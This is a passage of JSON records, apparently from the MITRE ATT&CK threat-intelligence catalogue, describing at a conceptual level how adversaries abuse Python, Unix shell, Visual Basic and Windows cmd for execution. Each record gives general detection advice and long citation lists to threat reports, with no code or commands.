Microsoft Actinium February 2022),(Citation: Symantec MuddyWater Dec 2018),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Proofpoint TA505 Sep 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: Carbon Black JCry May 2019),(Citation: KISA Operation Muzabi),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Bitdefender FIN8 July 2021),(Citation: Symantec WastedLocker June 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: NCC Group Team9 June 2020),(Citation: Talos Sodinokibi April 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: Cybereason PowerLess February 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: FBI Flash FIN7 USB),(Citation: Symantec Dragonfly Sept 2017),(Citation: Talos Cobalt Group July 2018),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Google TAG Lazarus Jan 2021),(Citation: Picus Emotet Dec 2018),(Citation: RATANKBA),(Citation: Cybereason Valak May 2020),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: Cisco DNSMessenger March 2017),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Forcepoint Monsoon),(Citation: Alperovitch 2014),(Citation: Mandiant No Easy Breach),(Citation: CISA AA20-301A Kimsuky),(Citation: FireEye NETWIRE March 2019),(Citation: Unit 42 WhisperGate January 2022),(Citation: Talos Kimsuky Nov 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: FireEye FIN7 April 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: CERT-FR PYSA April 2020),(Citation: Unit 42 Inception November 2018),(Citation: FireEye APT41 March 2020),(Citation: FireEye TRITON 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Symantec Elfin Mar 2019),(Citation: Red Canary Emotet Feb 2019),(Citation: GitHub PowerSploit May 2012),(Citation: PWC WellMess July 2020),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Symantec Chafer February 2018),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: ESET Turla Mosquito May 2018),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Anomali Static Kitten February 2021),(Citation: CrowdStrike BloodHound April 2018),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: FireEye FIN10 June 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: ESET Dukes October 2019),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Volexity SolarWinds),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Netwalker May 2020),(Citation: Morphisec FIN7 June 2017),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Cybereason Molerats Dec 2020),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: FireEye APT35 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: Intel 471 REvil March 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: Group IB Ransomware May 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Palo Alto OilRig Sep 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Lazarus RATANKBA),(Citation: McAfee Cuba April 2021),(Citation: Carbon Black Emotet Apr 2019),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: ESET T3 Threat Report 2021),(Citation: Cyberreason Anchor December 2019),(Citation: FireEye APT41 Aug 2019),(Citation: SecureList Griffon May 2019),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: AADInternals Documentation),(Citation: Check Point Warzone Feb 2020),(Citation: FireEye FIN6 April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: EST Kimsuky April 2019),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Volexity Exchange Marauder March 2021),(Citation: Securelist DarkVishnya Dec 2018),(Citation: FireEye Hancitor),(Citation: FireEye Operation Double Tap),(Citation: CheckPoint Bandook Nov 2020),(Citation: Microsoft Unidentified Dec 2018),(Citation: Accenture MUDCARP March 2019),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: CISA ComRAT Oct 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: FireEye TEMP.Veles 2018),(Citation: Microsoft Holmium June 2020),(Citation: NCC Group Black Basta June 2022),(Citation: FireEye Periscope March 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: CrowdStrike Grim Spider May 2019),(Citation: FireEye APT29),(Citation: FireEye APT19),(Citation: Proofpoint TA459 April 2017),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Trend Micro Emotet Jan 2019),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Lab52 WIRTE Apr 2019),(Citation: Cisco Talos Avos Jun 2022),(Citation: OilRig New Delivery Oct 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: NCC Group Chimera January 2021),(Citation: Donut Github),(Citation: GitHub Pupy),(Citation: Intrinsec Egregor Nov 2020),(Citation: Palo Alto Sofacy 06-2018),(Citation: Symantec Thrip June 2018),(Citation: Trend Micro Black Basta Spotlight September 2022),(Citation: Symantec Cicada November 2020),(Citation: MuddyWater TrendMicro June 2018),(Citation: Unit 42 Playbook Dec 2017),(Citation: US-CERT TA18-074A),(Citation: FireEye APT32 May 2017),(Citation: Reaqta MuddyWater November 2017),(Citation: Symantec Waterbug Jun 2019),(Citation: FireEye APT33 Guardrail),(Citation: CISA WellMess July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Bromium Ursnif Mar 2017),(Citation: BlackBerry CostaRicto November 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: BiZone Lizar May 2021),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Microsoft HAFNIUM March 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: PowerSploit Documentation),(Citation: Talos Lokibot Jan 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos MuddyWater May 2019),(Citation: Talos Frankenstein June 2019),(Citation: ESET Exchange Mar 2021),(Citation: Palo Alto OilRig May 2016),(Citation: Group IB Ransomware September 2020),(Citation: Visa FIN6 Feb 2019),(Citation: ESET ComRAT May 2020),(Citation: FireEye APT29 Nov 2018),(Citation: Symantec Emotet Jul 2018),(Citation: Cybereason TA505 April 2019),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: CobaltStrike Daddy May 2017),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: cobaltstrike manual),(Citation: Check Point Meteor Aug 2021),(Citation: FireEye POSHSPY April 2017),(Citation: Trend Micro njRAT 2018),(Citation: Symantec Seaduke 2015),(Citation: Cymmetria Patchwork),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: TrendMicro MacOS April 2018),(Citation: Cycraft Chimera April 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: RiskIQ Cobalt Jan 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Microsoft PowerShell CLM),(Citation: Microsoft PS JEA),(Citation: Netspi PowerShell Execution Policy Bypass)"}
{"ID":"T1059.006","name":"Command and Scripting Interpreter: Python","description":"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.","url":"https://attack.mitre.org/techniques/T1059/006","created":"09 March 2020","last modified":"26 July 2021","version":"1.0","tactics":"Execution","detection":"Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1059","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, root, SYSTEM","supports remote":null,"system requirements":"Python is installed.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Unit 42 MechaFlounder March 2019),(Citation: 360 Machete Sep 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Trend Micro Muddy Water March 2021),(Citation: Donut Github),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: GitHub SILENTTRINITY March 2022),(Citation: ESET Ebury Oct 2017),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FoxIT Wocao December 2019),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: Cybereason Chaes Nov 2020),(Citation: Riskiq Remcos Jan 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: US-CERT TA18-074A),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Unit42 CookieMiner Jan 2019),(Citation: ESET Machete July 2019),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Talos Cobalt Strike September 2020),(Citation: synack 2016 review),(Citation: Securelist Machete Aug 2014),(Citation: CERT-FR PYSA April 2020),(Citation: Trend Micro Tick November 2019),(Citation: CoinTicker 2019),(Citation: Morphisec ShellTea June 2019),(Citation: TrendMicro Tonto Team October 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: CheckPoint Bandook Nov 2020),(Citation: Anomali Rocke March 2019),(Citation: CobaltStrike Daddy May 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: BitDefender Chafer May 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: Google Election Threats October 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Talos PoetRAT April 2020),(Citation: KISA Operation Muzabi),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Symantec Seaduke 2015),(Citation: Cylance Machete Mar 2017),(Citation: Cybereason Molerats Dec 2020),(Citation: GitHub Pupy),(Citation: CheckPoint SpeakUp Feb 2019),"}
{"ID":"T1059.004","name":"Command and Scripting Interpreter: Unix Shell","description":"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.","url":"https://attack.mitre.org/techniques/T1059/004","created":"09 March 2020","last modified":"26 July 2021","version":"1.1","tactics":"Execution","detection":"Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. ","platforms":"Linux, macOS","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1059","defenses bypassed":null,"contributors":null,"permissions required":"root, User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Kobalos Feb 2021),(Citation: Chaos Stolen Backdoor),(Citation: Cisco Talos Intelligence Group),(Citation: ESET LoudMiner June 2019),(Citation: ESET TeleBots Oct 2018),(Citation: Intezer Doki July 20),(Citation: objectivesee osx.shlayer apple approved 2020),(Citation: trendmicro xcsset xcode project 2020),(Citation: Trend Micro Skidmap),(Citation: CISA AppleJeus Feb 2021),(Citation: Trend Micro TeamTNT),(Citation: Aqua Kinsing April 2020),(Citation: Talos Rocke August 2018),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Fidelis Turbo),(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: FireEye APT41 March 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: objsee mac malware 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: CoinTicker 2019),(Citation: Proofpoint NETWIRE December 2020),(Citation: Objective-See MacMa Nov 2021),(Citation: sentinelone shlayer to zshlayer),(Citation: ANSSI Sandworm January 2021),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Leonardo Turla Penquin May 2020),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Unit 42 Hildegard Malware),(Citation: ObjectiveSee AppleJeus 2019),(Citation: Scarlet Mimic Jan 2016),(Citation: ESET DazzleSpy Jan 2022),(Citation: Medium Anchor DNS July 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: objective-see windtail1 dec 2018),(Citation: FireEye Periscope March 2018),(Citation: 20 macOS Common Tools and Techniques),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: NSA/FBI Drovorub August 2020),(Citation: Fysbis Palo Alto Analysis),"}
{"ID":"T1059.005","name":"Command and Scripting Interpreter: Visual Basic","description":"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )","url":"https://attack.mitre.org/techniques/T1059/005","created":"09 March 2020","last modified":"07 April 2023","version":"1.4","tactics":"Execution","detection":"Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Module: Module Load, Process: Process Creation, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1059","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Palo Alto Comnie),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Cybereason Oceanlotus May 2017),(Citation: PTSecurity Higaisa 2020),(Citation: FoxIT Wocao December 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Proofpoint TA505 June 2018),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ATT Sidewinder January 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: Kaspersky WIRTE November 2021),(Citation: Crowdstrike Qakbot October 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: SecureWorks August 2019),(Citation: ESET Grandoreiro April 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: Unit 42 KerrDown February 2019),(Citation: Mandiant UNC3313 Feb 2022),(Citation: McAfee Lazarus Jul 2020),(Citation: Unit 42 Bisonal July 2018),(Citation: Trend Micro TA505 June 2019),(Citation: Github Koadic),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Juniper IcedID June 2020),(Citation: Microsoft Actinium February 2022),(Citation: Symantec MuddyWater Dec 2018),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Carbon Black JCry May 2019),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Gamaredon June 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Talos Bisonal Mar 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Talos Cobalt Group July 2018),(Citation: Cofense NanoCore Mar 2018),(Citation: Picus Emotet Dec 2018),(Citation: McAfee Honeybee),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: Check Point APT34 April 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Rancor Unit42 June 2018),(Citation: DFIR Conti Bazar Nov 2021),(Citation: FireEye NETWIRE March 2019),(Citation: Unit 42 WhisperGate January 2022),(Citation: CERT-EE Gamaredon January 2021),(Citation: Kaspersky Adwind Feb 2016),(Citation: Talos Kimsuky Nov 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Unit 42 Inception November 2018),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Trend Micro Tick November 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: Proofpoint NETWIRE December 2020),(Citation: fsecure NanHaiShu July 2016),(Citation: Unit42 Molerat Mar 2020),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Symantec Shuckworm January 2022),(Citation: Symantec Bumblebee June 2022),(Citation: Lazarus APT January 2022),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: ESET BlackEnergy Jan 2016),(Citation: Unit 42 OilRig Sept 2018),(Citation: Securelist Remexi Jan 2019),(Citation: Eset Ramsay May 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: Cisco Ukraine Wipers January 2022),(Citation: FBI FLASH APT39 September 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Qualys LolZarus),(Citation: Trend Micro Qakbot May 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: Talos PoetRAT October 2020),(Citation: G Data Sodinokibi June 2019),(Citation: Unit42 Xbash Sept 2018),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Telebots June 2017),(Citation: Kroll Qakbot June 2020),(Citation: Volexity Patchwork June 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: FireEye FIN7 Aug 2018),(Citation: ESET TeleBots Oct 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: IBM TA505 April 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET Telebots Dec 2016),(Citation: Carbon Black Emotet Apr 2019),(Citation: Secureworks IRON TILDEN Profile),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Kaspersky Lyceum October 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Talos Group123),(Citation: CheckPoint Bandook Nov 2020),(Citation: Kaspersky StoneDrill 2017),(Citation: ClearSky MuddyWater June 2019),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Talos Emotet Jan 2019),(Citation: Cylance Dust Storm),(Citation: Microsoft Holmium June 2020),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Proofpoint TA459 April 2017),(Citation: Trend Micro Emotet Jan 2019),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Lab52 WIRTE Apr 2019),(Citation: Trend Micro Black Basta October 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: 360 Machete Sep 2020),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Donut Github),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Trend Micro Qakbot December 2020),(Citation: MuddyWater TrendMicro June 2018),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: FireEye Metamorfo Apr 2018),(Citation: Picus Sodinokibi January 2020),(Citation: BlackBerry Bahamut),(Citation: Symantec Waterbug Jun 2019),(Citation: Reaqta MuddyWater November 2017),(Citation: Bromium Ursnif Mar 2017),(Citation: Kaspersky MoleRATs April 2019),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: HP SVCReady Jun 2022),(Citation: ClearSky Lazarus Aug 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Talos Lokibot Jan 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Unit 42 BackConfig May 2020),(Citation: Group IB Ransomware September 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Symantec Emotet Jul 2018),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: CobaltStrike Daddy May 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ThreatConnect Kimsuky September 2020),(Citation: Talos PoetRAT April 2020),(Citation: Cyberint Qakbot May 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Malwarebytes SmokeLoader 2016),(Citation: TrendMicro MacOS April 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Proofpoint TA505 Sep 2017),(Citation: win10_asr),(Citation: Default VBS macros Blocking )"}
{"ID":"T1059.003","name":"Command and Scripting Interpreter: Windows Command Shell","description":"Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.","url":"https://attack.mitre.org/techniques/T1059/003","created":"09 March 2020","last modified":"26 July 2021","version":"1.2","tactics":"Execution","detection":"Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1059","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant APT1),(Citation: Palo Alto Comnie),(Citation: FireEye APT33 Sept 2017),(Citation: Group IB Silence Sept 2018),(Citation: ESET InvisiMole June 2018),(Citation: Flashpoint FIN 7 March 2019),(Citation: Crowdstrike Qakbot October 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: FireEye APT17),(Citation: CoinTicker 2019),(Citation: SecureList Silence Nov 2017),(Citation: Sophos Netwalker May 2020),(Citation: KISA Operation Muzabi),(Citation: NTT Security Flagpro new December 2021),(Citation: Talos NavRAT May 2018),(Citation: Zscaler Bazar September 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: APT15 Intezer June 2018),(Citation: Securelist Darkhotel Aug 2015),(Citation: Mandiant APT1 Appendix),(Citation: Symantec Sowbug Nov 2017),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Check Point APT34 April 2021),(Citation: Palo Alto MoonWind March 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Unit 42 WhisperGate January 2022),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Unit 42 TA551 Jan 2021),(Citation: CIRCL PlugX March 2013),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: FireEye admin@338),(Citation: PWC WellMess July 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Symantec Suckfly May 2016),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Symantec Wiarp May 2012),(Citation: McAfee Sharpshooter December 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Cybereason Chaes Nov 2020),(Citation: Accenture Hogfish April 2018),(Citation: ATT QakBot April 2021),(Citation: Cyberreason Anchor December 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Sophos SamSam Apr 2018),(Citation: Deep Instinct Black Basta August 2022),(Citation: Forcepoint Felismus Mar 2017),(Citation: ASERT InnaputRAT April 2018),(Citation: Talos ZxShell Oct 2014),(Citation: CheckPoint Bandook Nov 2020),(Citation: ESET Zebrocy May 2019),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: FireEye Maze May 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Trend Micro Black Basta October 2022),(Citation: Microsoft PLATINUM April 2016),(Citation: EFF Manul Aug 2016),(Citation: Unit 42 SeaDuke 2015),(Citation: US-CERT TYPEFRAME June 2018),(Citation: ESET LightNeuron May 2019),(Citation: Fidelis INOCNATION),(Citation: McAfee Bankshot),(Citation: Unit 42 Playbook Dec 2017),(Citation: Picus Sodinokibi January 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: Cybereason Bazar July 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: BiZone Lizar May 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Mandiant APT41),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Unit 42 BackConfig May 2020),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Dragos Crashoverride 2018),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: 